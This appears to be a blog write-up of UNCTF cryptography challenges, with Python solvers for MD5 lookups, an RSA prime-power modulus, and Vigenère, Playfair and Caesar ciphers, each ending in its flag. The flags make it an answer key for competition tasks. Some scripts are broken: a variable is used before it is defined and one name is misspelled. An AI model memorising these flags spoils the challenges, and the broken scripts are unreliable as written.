<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="string">&#x27;4c614360da93c0a041b22e537de151eb&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;8d9c307cb7f3c4a32822a51922d1ceaa&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;0d61f8370cad1d412f80b84d143e1257&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;800618943025315f869e4e1f09471012&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;f95b70fdc3088560732a5ac135644506&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cfcd208495d565ef66e7dff9f98764da&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cfcd208495d565ef66e7dff9f98764da&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;4a8a08f09d37b73795649038408b5f33&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cfcd208495d565ef66e7dff9f98764da&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cfcd208495d565ef66e7dff9f98764da&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cfcd208495d565ef66e7dff9f98764da&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> <span class="string">&#x27;&#123;&#125;_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#x27;</span>:</span><br><span class="line">        md = hashlib.md5()</span><br><span class="line">        md.update(w.encode())</span><br><span class="line">        m=md.hexdigest()</span><br><span class="line">        <span class="keyword">if</span> m == i:</span><br><span class="line">            <span class="built_in">print</span>(w,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>#UNCTF{e84fed028b9046fc0e8f080e96e72184}</p>
<h2 id="MD5-2"><a href="#MD5-2" class="headerlink" title="MD5-2"></a>MD5-2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">m=[]</span><br><span class="line">m.append(<span class="built_in">int</span>(<span class="string">&#x27;4c614360da93c0a041b22e537de151eb&#x27;</span>,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">l = [<span class="string">&#x27;4c614360da93c0a041b22e537de151eb&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;c1fd731c6d60040369908b4a5f309f41&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;80fdc84bbb5ed9e207a21d5436efdcfd&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;b48d19bb99a7e6bb448f63b75bc92384&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;39eaf918a52fcaa5ed9195e546b021c1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;795d6869f32db43ff5b414de3c235514&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;f59a054403f933c842e9c3235c136367&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;c80b37816048952a3c0fc9780602a2fa&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;810ecef68e945c3fe7d6accba8b329bd&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cad06891e0c769c7b02c228c8c2c8865&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;470a96d253a639193530a15487fea36f&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;470a96d253a639193530a15487fea36f&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;4bdea6676e5335f857fa8e47249fa1d8&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;810ecef68e945c3fe7d6accba8b329bd&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;edbb7ab78cde98a07b9b5a2ab284bf0a&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;44b43e07e9af05e3b9b129a287e5a8df&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a641c08ed66b55c9bd541fe1b22ce5c0&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;abed1f675819a2c0f65c9b7da8cab301&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;738c486923803a1b59ef17329d70bbbd&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;7e209780adf2cd1212e793ae8796ed7c&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a641c08ed66b55c9bd541fe1b22ce5c0&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a641c08ed66b55c9bd541fe1b22ce5c0&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;636a84a33e1373324d64463eeb8e7614&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;6ec65b4ab061843b066cc2a2f16820d5&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a4a39b59eb036a4a8922f7142f874114&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;8c34745bd5b5d42cb3efe381eeb88e4b&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;5b1ba76b1d36847d632203a75c4f74e2&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;d861570e7b9998dbafb38c4f35ba08bc&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;464b7d495dc6019fa4a709da29fc7952&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;8eb69528cd84b73d858be0947f97b7cc&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;dd6ac4c783a9059d11cb0910fc95d4a&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;4b6b0ee5d5f6b24e6898997d765c487c&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;b0762bc356c466d6b2b8f6396f2e041&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;8547287408e2d2d8f3834fc1b90c3be9&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;82947a7d007b9854fa62efb18c9fd91f&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;8ddafe43b36150de851c83d80bd22b0a&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;c7b36c5f23587e285e528527d1263c8b&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;2a0816e8af86e68825c9df0d63a28381&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;63ce72a42cf62e6d0fdc6c96df4687e3&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">39</span>):</span><br><span class="line">    a = <span class="built_in">hex</span>(<span class="built_in">int</span>(l[i], <span class="number">16</span>))[<span class="number">2</span>:]  </span><br><span class="line">    m.append(<span class="built_in">int</span>(a,<span class="number">16</span>)^<span class="built_in">int</span>(m[i-<span class="number">1</span>]))</span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    a = <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a)!=<span class="number">32</span>:<span class="comment">#发现有两个数据长度不正确  然后判断一下 在前面加上一个  0</span></span><br><span class="line">        a = <span class="string">&#x27;0&#x27;</span>+a</span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#123;&#125;_1234567890&#x27;</span>:</span><br><span class="line">        b = hashlib.md5(q.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> b == a:</span><br><span class="line">            <span class="built_in">print</span>(q,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>UNCTF{a197271943ceb3c3fe98bcadf10c29d4}</p>
<h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>已知n,e,c然后求得d就可以求出m   </p>
<p>把n放在在线网站上直接分解  或者利用gmpy2.iroot()开四次方</p>
<p>根据欧拉公式求得  phi然后既可以求出d</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">p=gmpy2.iroot(n)[<span class="number">0</span>]</span><br><span class="line">n = <span class="number">62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504</span></span><br><span class="line">p=<span class="number">89065756791595323358603857939783936930073695697065732353414009005162022399741</span></span><br><span class="line"><span class="comment">#p=gmpy2.iroot(int(n),4)[0]</span></span><br><span class="line">phi = p**<span class="number">4</span> - p**<span class="number">3</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment">#unctf&#123;pneum0n0ultram01cr0sc0p01cs01l01c0v0lcan0c0n010s01s&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="crypto-Multi-table"><a href="#crypto-Multi-table" class="headerlink" title="crypto-Multi table"></a>crypto-Multi table</h2><p>先根据给出的SDCGM  和   UNCTF  爆破出key&#x3D; [9,15,23,16]</p>
<p>然后利用脚本爆破  然后在对应位置加上  { }  和  _</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">table=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    table[i]=ascii_uppercase[i:]+ascii_uppercase[:i]</span><br><span class="line"><span class="built_in">print</span>(table)</span><br><span class="line"></span><br><span class="line">scii_uppercase = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base_table=[<span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;B&#x27;</span>]</span><br><span class="line"><span class="comment"># c = &#x27;SDCGW&#x27;</span></span><br><span class="line">c = <span class="string">&#x27;SDCGWMPNVHGAXHUGERASMEZJNDBWNUZHETD&#x27;</span></span><br><span class="line"><span class="comment"># for i in range(0,25):</span></span><br><span class="line"><span class="comment">#     s = table[i][base_table.index(&#x27;T&#x27;)]</span></span><br><span class="line"><span class="comment">#     if s ==&#x27;G&#x27;:</span></span><br><span class="line"><span class="comment">#         print(i)</span></span><br><span class="line">key = [<span class="number">9</span>,<span class="number">15</span>,<span class="number">23</span>,<span class="number">16</span>]</span><br><span class="line">x=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> c:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ascii_uppercase:</span><br><span class="line">        s = table[key[x % <span class="number">4</span>]][base_table.index(i)]</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">if</span> s == j:</span><br><span class="line">            <span class="built_in">print</span>(i,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;WOW_YOU_KNOW_THIS_IS_VIGENERE_CIPHER&#125;</span><br></pre></td></tr></table></figure>



<h2 id="single-table"><a href="#single-table" class="headerlink" title="single_table"></a>single_table</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> B C D E F </span><br><span class="line"></span><br><span class="line"><span class="number">2</span> G H I K M</span><br><span class="line"></span><br><span class="line"><span class="number">3</span> N O  Q R S</span><br><span class="line"></span><br><span class="line"><span class="number">4</span> T U V W X</span><br><span class="line"></span><br><span class="line"><span class="number">5</span> Z P L A Y </span><br><span class="line"></span><br><span class="line">OT UB M&#123;B CQ_SP H_W OQ A_U AY FM KL  WS&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">3</span> <span class="number">2</span>  <span class="number">4</span> <span class="number">2</span>  U</span><br><span class="line"></span><br><span class="line"><span class="number">4</span> <span class="number">1</span>  <span class="number">3</span> <span class="number">1</span>  N</span><br><span class="line"></span><br><span class="line"><span class="number">4</span> <span class="number">2</span>    <span class="number">1</span> <span class="number">2</span> C</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="number">1</span>   <span class="number">4</span>  <span class="number">1</span> T</span><br><span class="line"></span><br><span class="line"><span class="number">2</span> <span class="number">5</span> <span class="number">1</span> <span class="number">5</span>   F&#123;</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="number">1</span>  <span class="number">2</span> <span class="number">1</span>  G</span><br><span class="line"></span><br><span class="line"><span class="number">12</span> <span class="number">32</span>   <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">33</span> <span class="number">13</span>   D_</span><br><span class="line"></span><br><span class="line"><span class="number">35</span> <span class="number">55</span>   Y</span><br><span class="line"></span><br><span class="line"><span class="number">52</span> <span class="number">32</span>   <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">22</span> <span class="number">42</span>    U_</span><br><span class="line"></span><br><span class="line"><span class="number">44</span> <span class="number">24</span>     K</span><br><span class="line"></span><br><span class="line"><span class="number">32</span>  <span class="number">32</span>   <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">33</span>  <span class="number">33</span>  Q</span><br><span class="line"></span><br><span class="line"><span class="number">54</span>   <span class="number">44</span>  W_</span><br><span class="line"></span><br><span class="line"><span class="number">42</span>  <span class="number">52</span>   P</span><br><span class="line"></span><br><span class="line"><span class="number">54</span>  <span class="number">54</span>   A</span><br><span class="line"></span><br><span class="line"><span class="number">55</span>  <span class="number">55</span>   Y</span><br><span class="line"></span><br><span class="line"><span class="number">15</span>  <span class="number">25</span>  M</span><br><span class="line"></span><br><span class="line"><span class="number">25</span>  <span class="number">15</span>  F</span><br><span class="line"></span><br><span class="line"><span class="number">24</span>  <span class="number">54</span>  A</span><br><span class="line"></span><br><span class="line"><span class="number">53</span>  <span class="number">23</span>   I</span><br><span class="line"></span><br><span class="line"><span class="number">44</span>  <span class="number">34</span>  R</span><br><span class="line"></span><br><span class="line"><span class="number">35</span>  <span class="number">45</span>   X</span><br></pre></td></tr></table></figure>

<p>得到UNCTF{GOD_YOU_KOQW_PAYMFAIRX}</p>
<p>然后因为这是playfair可以根据意思改一下flag</p>
<p>UNCTF{GOD_YOU_KNOW_PLAYFAIR}</p>
<h2 id="caesar"><a href="#caesar" class="headerlink" title="caesar"></a>caesar</h2><p>根据提示他把ASCII码表换成了base64对照表  然后找出每个字母对应的表数  经过尝试 凯撒的偏移量是19  但是有的加上19之后超过了64  所以减上64</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># c = &#x27;B6vAy&#123;dhd_AOiZ_KiMyLYLUa_JlL/HY&#125;&#x27;</span></span><br><span class="line">c = <span class="string">&#x27;B6vAydhdAOiZKiMyLYLUaJlL/HY&#x27;</span>   <span class="comment">#去掉大括号和_</span></span><br><span class="line">base_table=[<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;`+&#x27;</span>,<span class="string">&#x27;/&#x27;</span>]</span><br><span class="line"><span class="built_in">list</span>=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    <span class="built_in">list</span>.append(base_table.index(i))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    <span class="keyword">if</span> (i+<span class="number">19</span>)&gt;<span class="number">63</span>:</span><br><span class="line">        flag+= base_table[i+<span class="number">19</span>-<span class="number">64</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=base_table[i+<span class="number">19</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;w0w_Th1s_d1fFerent_c4eSar&#125;</span><br></pre></td></tr></table></figure>





